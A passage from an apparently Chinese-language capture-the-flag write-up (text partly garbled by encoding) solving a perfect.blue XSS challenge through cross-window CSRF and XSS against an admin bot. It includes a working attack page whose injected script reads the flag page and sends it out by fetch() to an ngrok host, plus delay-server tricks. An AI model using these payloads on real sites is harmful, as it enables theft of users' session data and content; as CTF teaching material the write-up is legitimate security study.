&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">domain&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CHALL_HOST&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sameSite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Lax&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// samesite cookie lax è­¦æƒ•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">secure&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// è®¿é—®url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Done visiting -&amp;gt; &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">blpop&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;submissions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">submit_url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">submit_url&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// å–å‡ºredisä¸­æäº¤çš„url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å¤„ç†url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;XSS Bot ready&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flagåœ¨admin botçš„cookieä¸­ï¼Œå®ƒä¼šå¸¦ç€è¿™ä¸ªsessionè®¿é—®æˆ‘ä»¬çš„é¡µé¢ï¼Œå¦‚æœå®ƒç›´æ¥è®¿é—®/noteé‚£ä¹ˆå®ƒæœ¬åœ°çš„é¡µé¢ä¸Šå°±ä¼šæœ‰flagï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•è·å¾—&lt;/p>
&lt;p>æ³¨æ„åˆ°ç‰¹æ®Šçš„è¯·æ±‚å¤´&lt;code>X-Frame-Options=DENY&lt;/code>ï¼Œå®ƒä½¿å¾—è¯¥é¡µé¢ä¸å…è®¸è¢«ä»»ä½•é¡µé¢å¼•ç”¨ï¼Œä¹Ÿä¸å…è®¸å¼•ç”¨ä»»ä½•é¡µé¢ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨&lt;code>iframe&lt;/code>ç›¸å…³çš„æŠ€å·§æ¥åšï¼šå‘é€ç»™adminçš„é¡µé¢(on our host)ä¸Šå…±æœ‰ä¸¤ä¸ªiframeï¼Œç¬¬ä¸€ä¸ªsrcæŒ‡å‘/flag(å¯ä»¥çœ‹åˆ°flagçš„é¡µé¢)çš„iframeï¼Œç¬¬äºŒä¸ªiframeæœ‰æˆ‘ä»¬çš„xss payloadï¼Œè¿™ä¸ªpayloadä¸­çš„scriptè„šæœ¬å¯ä»¥åšåˆ°XFS - cross frame scripting(è¯»å–top.frames)æ¥åˆ°è¾¾åŸæœ‰çš„é¡µé¢ï¼Œè½¬å‘é¡µé¢çš„ç¬¬ä¸€ä¸ªiframeè¯»åˆ°flagå¹¶å–å‡ºï¼Œåˆ©ç”¨çš„æ˜¯ä¸¤ä¸ªiframeæ˜¯åŒæºçš„ï¼Œæ‰€ä»¥å¯ä»¥see each other&amp;rsquo;s content&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬æƒ³åˆ°ç”¨windowè€Œä¸æ˜¯iframeæ¥è¾¾åˆ°ç›¸ä¼¼çš„æ•ˆæœï¼ˆåŸç†ä¸€è‡´ï¼‰ï¼šå‘é€ç»™adminçš„é¡µé¢(on our host)ä¸Šæœ‰scriptå¯ä»¥åœ¨æ–°çª—å£æ‰“å¼€/noteé¡µé¢(å«æœ‰flag)ï¼Œç„¶åscriptç”¨csrfçš„æ–¹å¼post xss payload(è®¾ç½®&lt;code>target=&amp;quot;_blank&amp;quot;&lt;/code>ä½¿å…¶åœ¨æ–°çª—å£å‡ºç°)ï¼Œåœ¨postå®Œæˆä¹‹åå°†å½“å‰çª—å£è½¬ä¸ºä¹‹å‰çš„/note æ¥ä½¿postçš„xssæ‰§è¡Œï¼Œç”±äºåŒæºå¯ä»¥è·å¾—å«flagçš„/noteé¡µé¢çš„å†…å®¹ï¼Œå†fetchå¤–å¸¦flag&lt;/p>
&lt;p>æ€è·¯è·Ÿiframeçš„æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç”±åˆ‡æ¢iframeå˜ä¸ºåˆ‡æ¢Tab windowï¼Œæ¥ä¸‹æ¥å°è¯•å†™payload&lt;/p>
&lt;p>æ³¨æ„ä»¥ä¸‹xss botï¼Œç”±äºå®ƒçš„&lt;code>watiUntil&lt;/code>çš„è®¾ç½®ï¼Œä¸€æ—¦è¢«è®¤ä¸ºæ˜¯åŠ è½½å°±ä¼šç›´æ¥dieæ‰ï¼Œè¿™é‡Œçš„ç»•è¿‡æ–¹å¼æ˜¯ç”¨ä¸­è½¬é¡µé¢æ‰‹åŠ¨å»¶æ—¶è®©å…¶æŒ‚èµ·ï¼ˆ&lt;code>setTimeout&lt;/code>åˆ™èµ·ä¸åˆ°åŒæ ·çš„æ•ˆæœ&lt;/p>
&lt;p>payload-url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://xxxx/pb
&lt;/code>&lt;/pre>&lt;p>app.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/pb&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/pb.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delayThen404&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5050&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Local server running on port: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/pb.html&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>hello world&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://tbdxss.chal.perfect.blue/change_note&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;noteform&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">POST&lt;/span> &lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;_blank&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">textarea&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;payload&amp;#34;&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#75af00">cols&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;100&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span> &lt;span style="color:#75af00">form&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;noteform&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">textarea&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// open new window that has the flag and give it a &amp;#34;name&amp;#34; of &amp;#34;flagWindow&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;flagWindow&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// this POSTs the above form with an XSS note value to read and exfiltrate the flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// note: we must use \x3C as an alternate form of the &amp;#34;less than&amp;#34; character to avoid browser parser confusion inside
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;\x3Cscript&amp;gt;let flagWindow = window.open(&amp;#39;&amp;#39;, &amp;#39;flagWindow&amp;#39;); let flag = flagWindow.document.documentElement.innerText; fetch(&amp;#39;http://8709-68-51-145-201.ngrok.io/?flag=&amp;#39; + flag);\x3C/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">noteform&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Run this code after a 5 second delay to ensure the above POST has completed before we reload our XSS payload into *this* page.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// This loads our previously-posted XSS which will read the flag from the previously-opened window and exfiltrate it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span> &lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- æä¾›å»¶æ—¶æ¥è®©ä¸Šé¢çš„scriptæ‰§è¡Œ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://xxxx/delayThen404&amp;#39;&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;window.location.href=&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”åœ¨å¦ä¸€ä¸ªwpä¸­å­¦åˆ°delayè¿˜å¯ä»¥æœ‰ä¸“é—¨çš„å®šå‹å·¥å…·https://deelay.me/ï¼Œç”¨æ³•æ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>https://deelay.me/&amp;lt;delay in milliseconds&amp;gt;/&amp;lt;original url&amp;gt;
eg: https://deelay.me/5000/https://picsum.photos/200/300
&lt;/code>&lt;/pre>&lt;p>æ‰€ä»¥ä¸Šé¢çš„æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·åšï¼š&lt;/p>
&lt;ul>
&lt;li>index.phpï¼šåšå»¶æ—¶ï¼Œè½¬åˆ°main.php&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;
open(location.href + &amp;#39;main.php&amp;#39;, &amp;#39;_blank&amp;#39;)
&amp;lt;/script&amp;gt;
&amp;lt;img src=&amp;#34;https://deelay.me/20000/https://example.com&amp;#34;&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>main.phpï¼šæ–°å¼€ä¸¤ä¸ªtabåå½“å‰é¡µé¢é‡å®šå‘åˆ°å«flagçš„/noteä¸­&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;submit&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;opennote&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;_blank&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;https://tbdxss.chal.perfect.blue/note&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>submit.phpï¼šæ ‡å‡†csrf&lt;/li>
&lt;/ul>
